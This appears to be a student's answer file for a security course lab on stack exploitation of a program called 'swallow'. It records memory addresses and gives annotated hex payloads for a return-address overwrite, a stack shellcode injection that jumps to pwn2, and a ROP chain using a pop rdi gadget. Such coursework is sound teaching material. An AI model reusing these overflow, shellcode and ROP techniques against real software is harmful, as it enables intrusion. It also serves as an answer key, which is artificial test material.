@@ -1,0 +1,59 @@
+Q. At what address (hex) is pwn1 when swallow is running?
+0x00000000004017b5
+
+
+Q. At what address (hex) is pwn2 when swallow is running?
+0x00000000004017da
+
+
+Q. At what address (hex) is speed when the main212() function inside swallow is running?
+0x7fffffe7ffc0
+
+
+Q. At what address (hex) is the return address when main212() inside swallow is running?
+0x00000000004018d5 is the return address, stored at 0x7fffffe7ffe8 on the stack
+
+
+Q. At what address (hex) is the sequence of instructions "cmp rdx, rdi", "setae al", "ret" found when swallow is running?
+0x41a821
+
+
+Q. Your analysis of flight1 below
+Change return address attack, return to pwn1 after finishing main212()
+62 6f 6e 65 73 20 6f 66 -- bones<space>of (padding for speed) 
+20 66 75 6c 6c 20 66 69 -- <space>full<space>fi (padding for speed)
+66 74 79 20 6d 65 6e 20 -- fty<space>men<space> (padding for speed)
+6c 69 65 20 73 74 72 65 -- lie<space>stre (padding for speed) 
+77 6e 20 61 62 6f 75 74 -- wn<space>about (padding for speed)
+b5 17 40 00 00 00 00 00 -- change return address to pwn1
+
+<space> is ' '
+
+
+Q. Your analysis of flight2 below
+Stack code injection attack, do some instructions(mov rdi, 0xd4 (move argument into rdi); mov eax, 0x4017da) and jump to pwn2
+bf d4 00 00 00 -- mov edi, 0xd4
+b8 da 17 40 00 -- mov eax, 0x4017da (address of pwn2)
+ff e0 -- jmp rax (which contain the address of pwn2)
+61 20 73 63 -- a<space>sc (padding for speed)
+72 61 74 63 68 21 3f 20 -- ratch!?<space> (padding for speed)
+20 79 6f 75 72 20 61 72 -- <space>your<space>ar (padding for speed)
+6d 27 73 20 6f 66 66 21 -- m's<space>off! (padding for speed)
+c0 ff e7 ff ff 7f 00 00 -- change return address to top of stack, which will be execute next
+
+
+
+Q. Your analysis of flight3 below
+ROP, passing argument to rdi and get to function pwn2 
+62 6f 6e 65 73 20 6f 66 -- bones<space>of (padding for speed)
+20 66 75 6c 6c 20 66 69 -- <space>full<space>fi (padding for speed)
+66 74 79 20 6d 65 6e 20 -- fty<space>men<space> (padding for speed)
+6c 69 65 20 73 74 72 65 -- lie<space>stre (padding for speed)
+77 6e 20 61 62 6f 75 74 -- wn<space>about\0 (padding for speed)
+94 19 40 00 00 00 00 00 -- Change return address to 0x401994: pop rdi
+2a 00 00 00 00 00 00 00 -- Instruction at 0x401994: pop rdi so rdi=0x2a
+da 17 40 00 00 00 00 00 -- return to pwn2
+
+
+
+
